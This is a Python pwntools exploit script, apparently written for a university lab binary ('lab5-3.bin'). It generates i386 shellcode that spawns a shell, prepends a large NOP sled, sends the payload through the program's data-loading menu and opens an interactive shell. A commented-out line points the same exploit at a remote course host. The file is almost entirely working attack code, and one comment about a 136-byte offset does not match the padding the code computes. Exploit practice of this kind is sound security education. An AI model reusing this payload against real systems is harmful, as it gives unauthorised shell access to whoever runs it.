from pwn import *

# Set CPU context architecture
context.arch = "i386"

# Allocation size
ALLOC_SIZE = 1000000 * 1024
ALLOC_SIZE_BYTE = (str(ALLOC_SIZE).encode())

# Shell call code
SHELLCODE = asm(shellcraft.i386.linux.sh())
SHELLCODE_SIZE = len(SHELLCODE)
#print("The shellcode payload is:", (SHELLCODE))
#print("")

# Segmentation Fault is at offset 136, so we create 136 junk bytes
PADDING = (b"\x90"*(ALLOC_SIZE - SHELLCODE_SIZE))
#print("The NOP Sled padding bytes are: ", PADDING)
#print("")

# Payload
payload = (PADDING + SHELLCODE)
#print("The full payload is :", payload)
#print("")

# Launch exploit process
#p = gdb.debug("./lab5-3.bin")            # run exploit against binary locally with process attached to gdb
p = process("./lab5-3.bin")              # run exploit against binary locally without attacking the process to gdb
#p = remote("csc748.hostbin.org", 7053)   # run the exploit against a remote process
print("\n")

# Read prompt
getChoice = p.recvuntil("Choice: ")
print(getChoice)
#print("\n")

# Send option to load data
p.sendline(b'1')

# Read prompt
getLength = p.recvuntil("Length: ")
print(getLength)
#print("\n")

# Send length of load data
p.sendline(ALLOC_SIZE_BYTE)

# Read prompt
getData = p.recvuntil("Data: ")
print(getData)
#print("\n")

# Send exploit bytes
p.send(payload)

# Read prompt
getChoice = p.recvuntil("Choice: ")
print(getChoice)
#print("\n")

"""
# Send option to search
p.send(b"AA")

# Read prompt
getChoice = p.recvuntil("Enter search term: ")
print(getChoice)
#print("\n")
"""

# Send option to exit
p.sendline(b'3')

# Switch to interactive after gaining shell
p.interactive()
